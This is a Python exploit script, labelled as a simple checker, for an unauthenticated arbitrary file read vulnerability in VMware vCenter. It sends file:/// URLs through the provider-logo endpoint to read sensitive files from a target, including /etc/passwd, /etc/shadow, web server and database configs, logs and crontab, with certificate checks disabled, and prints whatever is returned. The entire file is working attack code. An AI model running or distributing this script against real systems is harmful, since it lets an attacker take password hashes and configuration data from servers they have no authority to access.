import requests
import sys
import logging
logging.basicConfig(level=logging.DEBUG)
from requests.packages import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

print (
    '''\nVMware vCenter earlier versions (7.0.2.00100) - unauthorized arbitrary file read vulnerability\n
        Not a sophisticated exploit - this is a simple checker
    ''')
#coded by d0rkerDevil
url = sys.argv[1]

payload = ["/etc/passwd", "/etc/passwd",
"/etc/shadow",
"/etc/aliases",
"/etc/anacrontab",
"/etc/apache2/apache2.conf",
"/etc/apache2/httpd.conf",
"/etc/at.allow",
"/etc/at.deny",
"/etc/bashrc",
"/etc/bootptab",
"/etc/chrootUsers",
"/etc/chttp.conf",
"/etc/cron.allow",
"/etc/cron.deny",
"/etc/crontab",
"/etc/cups/cupsd.conf",
"/etc/exports",
"/etc/fstab",
"/etc/ftpaccess",
"/etc/ftpchroot",
"/etc/ftphosts",
"/etc/groups",
"/etc/grub.conf",
"/etc/hosts",
"/etc/hosts.allow",
"/etc/hosts.deny",
"/etc/httpd/access.conf",
"/etc/httpd/conf/httpd.conf",
"/etc/httpd/httpd.conf",
"/etc/httpd/logs/access_log",
"/etc/httpd/logs/access.log",
"/etc/httpd/logs/error_log",
"/etc/httpd/logs/error.log",
"/etc/httpd/php.ini",
"/etc/httpd/srm.conf",
"/etc/inetd.conf",
"/etc/inittab",
"/etc/issue",
"/etc/lighttpd.conf",
"/etc/lilo.conf",
"/etc/logrotate.d/ftp",
"/etc/logrotate.d/proftpd",
"/etc/logrotate.d/vsftpd.log",
"/etc/lsb-release",
"/etc/motd",
"/etc/modules.conf",
"/etc/motd",
"/etc/mtab",
"/etc/my.cnf",
"/etc/my.conf",
"/etc/mysql/my.cnf",
"/etc/network/interfaces",
"/etc/networks",
"/etc/npasswd",
]
for f in payload:
    target = url+"/ui/vcav-bootstrap/rest/vcav-providers/provider-logo?url=file:///"+f
    r = requests.get(target, verify=False)
    print (r.content)
